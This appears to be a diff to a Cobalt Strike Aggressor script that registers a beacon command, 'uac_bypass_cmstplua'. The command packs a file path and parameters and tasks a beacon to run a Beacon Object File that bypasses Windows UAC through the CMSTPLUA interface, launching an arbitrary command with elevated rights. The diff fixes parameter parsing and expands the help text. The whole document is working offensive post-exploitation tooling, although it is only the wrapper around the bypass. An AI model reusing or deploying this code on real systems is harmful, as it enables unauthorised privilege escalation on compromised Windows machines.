@@ -17,8 +17,15 @@ alias uac_bypass_cmstplua {
 	$object = readb($handle, -1);
 	closef($handle);
 
+	# Get parameters
+	if (strlen($0) > 20 + strlen($2) + 1) {
+		$parameters = substr($0, 20 + strlen($2) + 1);
+	} else {
+		$parameters = "";
+	}
+
 	# Pack empty arguments
-	$args = bof_pack($1, "zz", $2, substr($0, size($1) + size($2) + 2));
+	$args = bof_pack($1, "zz", $2, $parameters);
 
 	# Log the current task
 	btask($1, "Tasked beacon to run UACBypassCMSTPLUA!");
@@ -32,7 +39,8 @@ beacon_command_register(
     "Execute the given command (in a new process, without waiting for output) while bypassing UAC using CMSTPLUA.",
     "
 Command: uac_bypass_cmstplua
-Summary: Bypass UAC using CMSTPLUA and execute the given command!
+Summary: Execute the given command (in a new process, without waiting for output) while bypassing UAC using CMSTPLUA!
+Warning: A new process is spawned in which UAC is bypassed. This BOF does not get the output of that process.
 
 Usage:   uac_bypass_cmstplua <FILE> <PARAMETERS>
          FILE          Required    The file to execute as shell command.
